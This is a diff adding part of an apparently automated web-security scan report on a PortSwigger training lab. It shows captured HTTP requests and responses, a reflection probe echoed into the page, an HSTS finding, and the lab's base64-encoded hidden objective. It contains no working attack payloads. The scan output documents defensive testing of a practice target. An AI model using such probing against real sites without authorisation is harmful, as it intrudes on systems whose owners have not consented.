+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=1&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/15.jpg&quot;&gt;
+                            &lt;h3&gt;Pet Experience Days&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $45.52
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=2&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/36.jpg&quot;&gt;
+                            &lt;h3&gt;Caution Sign&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $23.82
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=3&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/70.jpg&quot;&gt;
+                            &lt;h3&gt;Eye Projectors&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $87.83
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=4&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/7.jpg&quot;&gt;
+                            &lt;h3&gt;Conversation Controlling Lemon&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $83.15
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=5&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/48.jpg&quot;&gt;
+                            &lt;h3&gt;BBQ Suitcase&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $50.18
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=6&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/9.jpg&quot;&gt;
+                            &lt;h3&gt;Fur Babies&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $92.02
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=7&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/6.jpg&quot;&gt;
+                            &lt;h3&gt;Com-Tool&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $92.44
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=8&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/73.jpg&quot;&gt;
+                            &lt;h3&gt;Beat the Vacation Traffic&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $69.51
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=9&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/53.jpg&quot;&gt;
+                            &lt;h3&gt;High-End Gift Wrapping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $76.89
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=10&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/29.jpg&quot;&gt;
+                            &lt;h3&gt;Waterproof Tea Bags&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $65.86
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=11&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/42.jpg&quot;&gt;
+                            &lt;h3&gt;Pest Control Umbrella&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $28.31
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=12&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/58.jpg&quot;&gt;
+                            &lt;h3&gt;There is No &amp;apos;I&amp;apos; in Team&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $60.69
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=13&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/75.jpg&quot;&gt;
+                            &lt;h3&gt;Grow Your Own Spy Kit&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $90.96
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=14&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/21.jpg&quot;&gt;
+                            &lt;h3&gt;Snow Delivered To Your Door&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $62.09
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=15&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/20.jpg&quot;&gt;
+                            &lt;h3&gt;Single Use Food Hider&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $2.44
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=16&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/56.jpg&quot;&gt;
+                            &lt;h3&gt;More Than Just Birdsong&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $71.65
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=17&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/37.jpg&quot;&gt;
+                            &lt;h3&gt;The Giant Enter Key&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $25.01
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=18&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/51.jpg&quot;&gt;
+                            &lt;h3&gt;Real Life Photoshopping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $30.87
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=19&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/31.jpg&quot;&gt;
+                            &lt;h3&gt;Couple&amp;apos;s Umbrella&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $44.03
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=20&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/section&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6j6wet-3f</code> — <code>artifacts/_/ev-mr6j6wet-3f/</code></div><div class="lbl">REQUEST</div><pre>GET /?message=umbraR3fl3ct7788 HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-encoding: gzip
+content-length: 2779
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;ecoms-pageheader&quot;&gt;
+                        &lt;img src=&quot;/resources/images/shop.svg&quot;&gt;
+                    &lt;/section&gt;
+                    &lt;div&gt;umbraR3fl3ct7788
+&lt;/div&gt;
+                    &lt;section class=&quot;container-list-tiles&quot;&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/52.jpg&quot;&gt;
+                            &lt;h3&gt;Hydrated Crackers&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $98.34
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=1&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/15.jpg&quot;&gt;
+                            &lt;h3&gt;Pet Experience Days&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $45.52
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=2&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/36.jpg&quot;&gt;
+                            &lt;h3&gt;Caution Sign&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $23.82
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=3&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/70.jpg&quot;&gt;
+                            &lt;h3&gt;Eye Projectors&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $87.83
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=4&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/7.jpg&quot;&gt;
+                            &lt;h3&gt;Conversation Controlling Lemon&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $83.15
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=5&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/48.jpg&quot;&gt;
+                            &lt;h3&gt;BBQ Suitcase&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $50.18
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=6&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/9.jpg&quot;&gt;
+                            &lt;h3&gt;Fur Babies&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $92.02
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=7&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/6.jpg&quot;&gt;
+                            &lt;h3&gt;Com-Tool&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $92.44
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=8&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/73.jpg&quot;&gt;
+                            &lt;h3&gt;Beat the Vacation Traffic&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $69.51
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=9&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/53.jpg&quot;&gt;
+                            &lt;h3&gt;High-End Gift Wrapping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $76.89
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=10&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/29.jpg&quot;&gt;
+                            &lt;h3&gt;Waterproof Tea Bags&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $65.86
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=11&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/42.jpg&quot;&gt;
+                            &lt;h3&gt;Pest Control Umbrella&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $28.31
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=12&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/58.jpg&quot;&gt;
+                            &lt;h3&gt;There is No &amp;apos;I&amp;apos; in Team&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $60.69
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=13&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/75.jpg&quot;&gt;
+                            &lt;h3&gt;Grow Your Own Spy Kit&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $90.96
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=14&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/21.jpg&quot;&gt;
+                            &lt;h3&gt;Snow Delivered To Your Door&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $62.09
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=15&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/20.jpg&quot;&gt;
+                            &lt;h3&gt;Single Use Food Hider&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $2.44
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=16&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/56.jpg&quot;&gt;
+                            &lt;h3&gt;More Than Just Birdsong&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $71.65
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=17&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/37.jpg&quot;&gt;
+                            &lt;h3&gt;The Giant Enter Key&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $25.01
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=18&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/51.jpg&quot;&gt;
+                            &lt;h3&gt;Real Life Photoshopping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $30.87
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=19&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/31.jpg&quot;&gt;
+                            &lt;h3&gt;Couple&amp;apos;s Umbrella&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $44.03
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=20&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/section&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 3. [burp] Strict transport security not enforced (3 URLs)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">(confidence: CERTAIN) [+2 more URL(s): https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/submitSolution, https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/filter] @ https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/product</div>
+<div><b>Reproduction</b></div><pre>Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6j5zne-39</code> — <code>artifacts/_/ev-mr6j5zne-39/</code></div><div class="lbl">REQUEST</div><pre>GET /product HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+
+GET /product?productId=2 HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 8144
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
